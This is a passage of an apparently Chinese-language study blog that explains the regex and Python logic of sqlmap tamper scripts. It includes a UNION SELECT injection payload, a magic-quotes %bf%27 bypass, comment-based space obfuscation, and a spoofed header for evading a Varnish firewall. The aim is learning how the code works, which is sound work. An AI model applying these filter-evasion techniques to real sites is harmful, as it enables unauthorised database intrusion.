class="hljs-string">r&quot;(?i)(\b(AND|OR)\b\s+)([^&gt;]+?)\s*&gt;\s*(\w+|&#x27;[^&#x27;]+&#x27;)&quot;</span>, payload)<br></code></pre></td></tr></table></figure><ul><li><code>(\b(AND|OR)\b\s+)</code>匹配了<code>AND</code>，这是第一个捕获组，也就是group(1)。</li><li><code>([^&gt;]+?)</code>匹配了<code>A</code>，这是第二个捕获组，也就是group(2)。</li><li><code>\s*&gt;\s*</code>匹配了<code>&gt;</code>，这是没有被捕获的部分。 </li><li><code>(\w+|&#39;[^&#39;]+&#39;)</code>匹配了<code>B</code>，这是第三个捕获组，也就是group(3)。</li></ul><h4 id="halfversionedmorekeywords"><a href="#halfversionedmorekeywords" class="headerlink" title="halfversionedmorekeywords"></a>halfversionedmorekeywords</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">match</span>):<br>    word = match.group(<span class="hljs-string">&#x27;word&#x27;</span>)<br>    <span class="hljs-comment">#group()是返回匹配的字符组</span><br><br>retVal = payload<br><br><span class="hljs-comment">#</span><br><span class="hljs-keyword">if</span> payload:<br>    retVal = re.sub(<span class="hljs-string">r&quot;(?\W&lt;=)(?P&lt;word&gt;[A-Za-z_]+)(?=\W|\Z)&quot;</span>, process, retVal)<br>    retVal = retVal.replace(<span class="hljs-string">&quot; /*!0&quot;</span>, <span class="hljs-string">&quot;/*!0&quot;</span>)<br>    <span class="hljs-comment">#这里要replace的原因是因为这个相当于是在字符串的前后各自加入一个注释符号，但是并没没有去除字符串之间的空格</span><br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure><p><code>re.sub</code>的语法</p><blockquote><p><code>re.sub(pattern, repl, string, count=0, flags=0)</code></p><p>其中：</p><ul><li>pattern是正则表达式；</li><li>repl是要将匹配子串替换成的字符串；</li><li>string是待做替换操作的字符串；</li><li>count是最大替换次数，默认为0表示不限制替换次数（即将所有符合正则表达式的子串都替换成repl）；</li></ul></blockquote><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231005140425111.png" alt="image-20231005140425111"> </p><p><code>?&lt;=</code>这个代表后行断言，它表示匹配一个在某个字符或子表达式后面的位置，但不包括这个字符或子表达式本身（<code>\W</code>是非单词字符的意思），所以这里是匹配一个非单词字符后面紧跟的位置，但不包括这个单词本身</p><p>例如</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/(?&lt;=\W)world/</span><br></code></pre></td></tr></table></figure><p>这样，我们就可以确保只匹配到 “world” 这个单词，而不是 “Hello” 中的 “lo” 或者其他包含 “world” 的字符串。注意，这个正则表达式并不会匹配到逗号（,），因为它只是一个后行断言，不会消耗任何字符。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">(?<span class="hljs-selector-tag">P</span>&lt;word&gt;<span class="hljs-selector-attr">[A-Za-z_]</span>+)<br></code></pre></td></tr></table></figure><p><code>(?P&lt;name&gt;…)</code> 是一个命名组，它表示匹配括号中的子表达式，并且给这个子表达式指定一个名称，可以用 name 来引用它。例如， <code>(?P&lt;year&gt;\d&#123;4&#125;)</code> 匹配一个四位数的年份，并且命名为 year</p><p>在命名为<code>word</code>以后可以使用<code>match.group(&#39;word&#39;)</code>来获取匹配到的单词，然后对其处理</p><p>如果我们不命名为<code>word</code>，就只能使用<code>match.group(1)</code>来获取匹配到的第一个子组</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tp">(?=\<span class="hljs-keyword">W</span>|\<span class="hljs-keyword">Z</span>)<br></code></pre></td></tr></table></figure><p>这里的?代表先行断言</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231005141336538.png" alt="image-20231005141336538"> </p><p>\Z则代表字符串的结束位置</p><blockquote><p>例如</p><p>如果我们想要匹配字符串 “Hello, world!” 中的 “world”，我们可以使用这个正则表达式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">/<span class="hljs-title function_">world</span>(?=\\W|\\Z)/<br></code></pre></td></tr></table></figure><p>这样，我们就可以确保只匹配到 “world” 这个单词，而不是 “Hello” 中的 “lo” 或者其他包含 “world” 的字符串。注意，这个正则表达式并不会匹配到逗号（,）或者感叹号（!），因为它们只是一个先行断言，不会消耗任何字符。</p></blockquote><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">?</span>\W&lt;=)(<span class="hljs-name">?P&lt;word&gt;</span>[<span class="hljs-name">A-Za-z_</span>]+)(<span class="hljs-name">?=</span>\W|\Z)<br></code></pre></td></tr></table></figure><p>所以，这一个正则的意思是</p><p>匹配一个由字母或下划线组成的单词，并且给这个单词命名为 word，以便后续引用。这个单词必须在非单词字符或字符串的结束位置之前，并且在非单词字符或字符串的开始位置之后。</p><p><code>kb.keywords</code>是一个包含所有 SQL 关键字的列表，例如 “SELECT”、“FROM”、“WHERE” 等。</p><p><code>IGNORE_SPACE_AFFECTED_KEYWORDS</code>是一个包含一些 SQL 关键字的列表，这些关键字在 SQL 语句中的空格会影响它们的含义。 例如，“SELECT” 和 “SELECT “ 是不同的关键字，前者表示选择操作，后者表示注释符号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">match</span>):<br>    word = match.group(<span class="hljs-string">&#x27;word&#x27;</span>)<br>    <span class="hljs-keyword">if</span> word.upper() <span class="hljs-keyword">in</span> kb.keywords <span class="hljs-keyword">and</span> word.upper() <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> IGNORE_SPACE_AFFECTED_KEYWORDS:<br>        <span class="hljs-keyword">return</span> match.group().replace(word, <span class="hljs-string">&quot;/*!0%s&quot;</span> % word)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> match.group()<br></code></pre></td></tr></table></figure><p>根据一个正则表达式匹配的结果，对其中的单词进行替换。如果这个单词是一个关键字，并且不在忽略空格影响的关键字列表中(如果匹配到select就不会替换)，那么就在这个单词前面加上 “&#x2F;*!0”，否则就保持原样。这个函数返回替换后的字符串。</p><p>这里有个不同的地方来了</p><h4 id="versionedmorekeywords"><a href="#versionedmorekeywords" class="headerlink" title="versionedmorekeywords"></a>versionedmorekeywords</h4><p>在versionedmorekeywords中出现了一个极其类似的正则表达式写法，但是匹配的字符是完全不一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">re.sub(<span class="hljs-string">r&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=\W|\Z)&quot;</span>, process, retVal)<br></code></pre></td></tr></table></figure><p>如果 retVal 是 “Hello, world!”，那么 process 函数会被应用到 “Hello” 和 “world” 这两个单词上，而不会影响逗号和感叹号。</p><blockquote><p>这里就要引入两个概念了</p><p><strong>普通的零宽断言：</strong></p><ul><li><strong>零宽度正预测先行断言</strong>（positive lookahead assertion），用 <code>(?=...)</code> 表示，表示当前位置后面的字符要符合某种模式。</li><li><strong>零宽度负预测先行断言</strong>（negative lookahead assertion），用 <code>(?!...)</code> 表示，表示当前位置后面的字符不要符合某种模式。</li><li><strong>零宽度正回顾后发断言</strong>（positive lookbehind assertion），用 <code>(?&lt;=...)</code> 表示，表示当前位置前面的字符要符合某种模式。</li><li><strong>零宽度负回顾后发断言</strong>（negative lookbehind assertion），用 <code>(?&lt;!...)</code> 表示，表示当前位置前面的字符不要符合某种模式。</li></ul><p><strong>零宽度正预测先行断言</strong></p><p>当我们想匹配字符串的开头或者一个非单词字符，可以使用另一种零宽断言，就是<strong>零宽度正预测先行断言</strong></p><p>这个表达式用 <code>(?=...)</code> 表示。这个表达式表示当前位置后面的字符要符合某种模式</p></blockquote><p>这两个表达式的区别在于这个例子中的表达式要求单词前面一定是一个非单词字符，而前一个表达式允许单词前面是字符串的开头。这在处理字符串的边界情况时可能有影响。例如，如果 retVal 是 <code>“_Hello, world!”</code>，那么这个例子表达式不会匹配到 <code>“_Hello”</code> 这个单词，因为它前面有一个下划线，而上个例子的表达式会匹配到 <code>“_Hello”</code> 这个单词，因为它前面是字符串的开头。</p><p>拿他的官方示例来说</p><p>当我们输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tamper(<span class="hljs-string">&#x27;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">?&lt;=</span>\W)(<span class="hljs-name">?P&lt;word&gt;</span>[<span class="hljs-name">A-Za-z_</span>]+)(<span class="hljs-name">?=</span>\W|\Z)<br></code></pre></td></tr></table></figure><p> 这个表达式会匹配到以下单词：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">ALL</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">NULL</span><br>CONCAT<br><span class="hljs-type">CHAR</span><br>IFNULL<br><span class="hljs-keyword">CAST</span><br><span class="hljs-keyword">AS</span><br><span class="hljs-built_in">CURRENT_USER</span><br></code></pre></td></tr></table></figure><p>而</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">?</span>\W&lt;=)(<span class="hljs-name">?P&lt;word&gt;</span>[<span class="hljs-name">A-Za-z_</span>]+)(<span class="hljs-name">?=</span>\W|\Z) <br></code></pre></td></tr></table></figure><p>会匹配到</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">ALL</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">NULL</span><br>CONCAT<br><span class="hljs-type">CHAR</span><br>IFNULL<br><span class="hljs-keyword">CAST</span><br><span class="hljs-keyword">AS</span><br><span class="hljs-built_in">CURRENT_USER</span><br></code></pre></td></tr></table></figure><p>可以看出，这两个表达式的区别在于第一个表达式不会匹配到字符串的开头的数字 1，而第二个表达式会匹配到。这是因为第一个表达式要求单词前面一定是一个非单词字符，而第二个表达式允许单词前面是字符串的开头。</p><h4 id="schemasplit双重匹配组"><a href="#schemasplit双重匹配组" class="headerlink" title="schemasplit双重匹配组"></a>schemasplit双重匹配组</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Splits FROM schema identifiers (e.g. &#x27;testdb.users&#x27;) with whitespace (e.g. &#x27;testdb 9.e.users&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Requirement:</span><br><span class="hljs-string">        * MySQL</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Notes:</span><br><span class="hljs-string">        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM testdb.users&#x27;)</span><br><span class="hljs-string">    &#x27;SELECT id FROM testdb 9.e.users&#x27;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">return</span> re.sub(<span class="hljs-string">r&quot;(?i)( FROM \w+)\.(\w+)&quot;</span>, <span class="hljs-string">r&quot;\g&lt;1&gt; 9.e.\g&lt;2&gt;&quot;</span>, payload) <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">else</span> payload<br></code></pre></td></tr></table></figure><p>重点解释一下这里的<code>g&lt;1&gt; g&lt;2&gt;</code></p><p><code>g&lt;1&gt;</code>对应着<code>g&lt;2&gt;</code>对应着前面的匹配组<code>( FROM \w+)</code>和<code>(\w+)</code></p><h4 id="if2case"><a href="#if2case" class="headerlink" title="if2case"></a>if2case</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> payload.find(<span class="hljs-string">&quot;IF&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">while</span> payload.find(<span class="hljs-string">&quot;IF(&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>        index = payload.find(<span class="hljs-string">&quot;IF(&quot;</span>)<br>        depth = <span class="hljs-number">1</span><br>        commas, end = [], <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(index + <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;IF(&quot;</span>), <span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> depth == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> payload[i] == <span class="hljs-string">&#x27;,&#x27;</span>:<br>                commas.append(i)<br><br>            <span class="hljs-keyword">elif</span> depth == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> payload[i] == <span class="hljs-string">&#x27;)&#x27;</span>:<br>                end = i<br>                <span class="hljs-keyword">break</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;(&#x27;</span>:<br>                depth += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;)&#x27;</span>:<br>                depth -= <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(commas) == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> end:<br>            a = payload[index + <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;IF(&quot;</span>):commas[<span class="hljs-number">0</span>]].strip(<span class="hljs-string">&quot;()&quot;</span>)<br>            b = payload[commas[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>:commas[<span class="hljs-number">1</span>]].lstrip().strip(<span class="hljs-string">&quot;()&quot;</span>)<br>            c = payload[commas[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>:end].lstrip().strip(<span class="hljs-string">&quot;()&quot;</span>)<br>            newVal = <span class="hljs-string">&quot;CASE WHEN (%s) THEN (%s) ELSE (%s) END&quot;</span> % (a, b, c)<br>            payload = payload[:index] + newVal + payload[end + <span class="hljs-number">1</span>:]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h4 id="unmagicquotes"><a href="#unmagicquotes" class="headerlink" title="unmagicquotes"></a>unmagicquotes</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    found = <span class="hljs-literal">False</span><br>    retVal = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> found:<br>            retVal += <span class="hljs-string">&quot;%bf%27&quot;</span><br>            found = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += payload[i]<br>            <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">if</span> found:<br>        _ = re.sub(<span class="hljs-string">r&quot;(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, retVal)<br>        <span class="hljs-keyword">if</span> _ != retVal:<br>            retVal = _<br>            retVal += <span class="hljs-string">&quot;-- -&quot;</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">in</span> retVal <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;--&#x27;</span>, <span class="hljs-string">&#x27;/*&#x27;</span>)):<br>            retVal += <span class="hljs-string">&quot;-- -&quot;</span><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure><h4 id="space2comment"><a href="#space2comment" class="headerlink" title="space2comment"></a>space2comment</h4><p>如果仅仅是要识别空格的话，就不需要复杂的使用正则表达式了，比如下面的这一段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-keyword">if</span> payload:<br>     retVal = <span class="hljs-string">&quot;&quot;</span><br>     quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>     <span class="hljs-comment">#检测是否遇到第一个空格</span><br>     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>         <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>             <span class="hljs-keyword">if</span> payload[i].isspace():<br>                 firstspace = <span class="hljs-literal">True</span><br>                 retVal += <span class="hljs-string">&quot;/**/&quot;</span><br>                 <span class="hljs-keyword">continue</span><br><span class="hljs-comment">#这里的取反代表进入或者推出单引号包裹的字符串</span><br>         <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>             quote = <span class="hljs-keyword">not</span> quote<br><br>         <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>             doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>         <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>             retVal += <span class="hljs-string">&quot;/**/&quot;</span><br>             <span class="hljs-keyword">continue</span><br><br>         retVal += payload[i]<br><br> <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure><p>后面的相关写法都是一模一样的</p><p>这里有一个很疑惑的地方，为什么要设置一个firstspace变量，因为和firstspace相关的代码是否有注释都不会影响他的结果</p><p>网上搜的结果是不对首个字段进行</p><h4 id="space2dash"><a href="#space2dash" class="headerlink" title="space2dash"></a>space2dash</h4><p>这里可以记录空格另一种替换方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> payload:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> payload[i].isspace():<br>            randomStr = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> xrange(random.randint(<span class="hljs-number">6</span>, <span class="hljs-number">12</span>)))<br>            retVal += <span class="hljs-string">&quot;--%s%%0A&quot;</span> % randomStr<br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-keyword">or</span> payload[i:i + <span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-- &#x27;</span>:<br>            retVal += payload[i:]<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += payload[i]<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure><p>先用<code>random.randint(6, 12)</code>生成一个6-12之间的随机整数n，然后用<code>xrange(n)</code>生成一个从0到n-1的迭代器，再用<code>for _ in</code>遍历这个迭代器，每次循环都用<code>random.choice(string.ascii_uppercase + string.ascii_lowercase)</code>从字母中随机选一个，最后用<code>&#39;&#39;.join</code>把所有选出的字母连接成一个新的字符串，并赋值给<code>randomStr</code>。这样就得到了一个随机长度（6到12个字符）的随机字符串。</p><h4 id="字符内部随机填入注释符号"><a href="#字符内部随机填入注释符号" class="headerlink" title="字符内部随机填入注释符号"></a>字符内部随机填入注释符号</h4><h3 id="写的很妙的一些地方"><a href="#写的很妙的一些地方" class="headerlink" title="写的很妙的一些地方"></a>写的很妙的一些地方</h3><h4 id="xfftest-py随机生成IP地址"><a href="#xfftest-py随机生成IP地址" class="headerlink" title="xfftest.py随机生成IP地址"></a>xfftest.py随机生成IP地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">randomIP</span>():<br>    octets = [<span class="hljs-number">10</span>]<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> octets <span class="hljs-keyword">or</span> octets[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> (<span class="hljs-number">10</span>, <span class="hljs-number">172</span>, <span class="hljs-number">192</span>):<br>        octets = random.sample(xrange(<span class="hljs-number">1</span>, <span class="hljs-number">255</span>), <span class="hljs-number">4</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span>.join(<span class="hljs-built_in">str</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> octets)<br></code></pre></td></tr></table></figure><ul><li>octets为空列表</li><li>octets的第一个元素是10、172或192中的一个</li></ul><p>如果满足其中一个条件，就重新生成四个随机数，并赋值给octets。如果不满足任何一个条件，就退出循环，并返回由octets组成的字符串作为IP地址。</p><h4 id="首次tamper的kwargs的使用"><a href="#首次tamper的kwargs的使用" class="headerlink" title="首次tamper的kwargs的使用"></a>首次tamper的kwargs的使用</h4><p>这里出现在varnish.py里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Appends a HTTP header &#x27;X-originating-IP&#x27; to bypass Varnish Firewall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Reference:</span><br><span class="hljs-string">        * https://web.archive.org/web/20160815052159/http://community.hpe.com/t5/Protect-Your-Assets/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Notes:</span><br><span class="hljs-string">        Examples:</span><br><span class="hljs-string">        &gt;&gt; X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)</span><br><span class="hljs-string">        &gt;&gt; X-remote-IP: TARGET_PROXY_IP (184.189.250.X)</span><br><span class="hljs-string">        &gt;&gt; X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)</span><br><span class="hljs-string">        &gt;&gt; x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)</span><br><span class="hljs-string">        &gt;&gt; X-remote-IP: * or %00 or %0A</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    headers = kwargs.get(<span class="hljs-string">&quot;headers&quot;</span>, &#123;&#125;)<br>    headers[<span class="hljs-string">&quot;X-originating-IP&quot;</span>] = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure><p>kwargs在函数定义中使用两个星号（**）来表示，这意味着函数会接收一个字典作为参数，字典中包含了所有传递给函数的关键字参数和它们的值</p><h4 id="‘-’的妙用hex2char-py"><a href="#‘-’的妙用hex2char-py" class="headerlink" title="‘_’的妙用hex2char.py"></a>‘_’的妙用hex2char.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> payload:<br>     <span class="hljs-keyword">for</span> match <span class="hljs-keyword">in</span> re.finditer(<span class="hljs-string">r&quot;\b0x([0-9a-f]+)\b&quot;</span>, retVal):<br>         <span class="hljs-comment"># i = 0</span><br>         <span class="hljs-comment"># print(match.group(i))</span><br>         <span class="hljs-comment"># i = i + 1</span><br>         <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(match.group(<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">2</span>:<br>             result = <span class="hljs-string">&quot;CONCAT(%s)&quot;</span> % <span class="hljs-string">&#x27;,&#x27;</span>.join(<span class="hljs-string">&quot;CHAR(%d)&quot;</span> % _ <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> getOrds(decodeHex(match.group(<span class="hljs-number">1</span>))))<br>         <span class="hljs-keyword">else</span>:<br>             result = <span class="hljs-string">&quot;CHAR(%d)&quot;</span> % <span class="hljs-built_in">ord</span>(decodeHex(match.group(<span class="hljs-number">1</span>)))<br>         retVal = retVal.replace(match.group(<span class="hljs-number">0</span>), result)<br><br> <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure><p>这里的正则表达式其实很简单，重点来看<code>result = &quot;CONCAT(%s)&quot; % 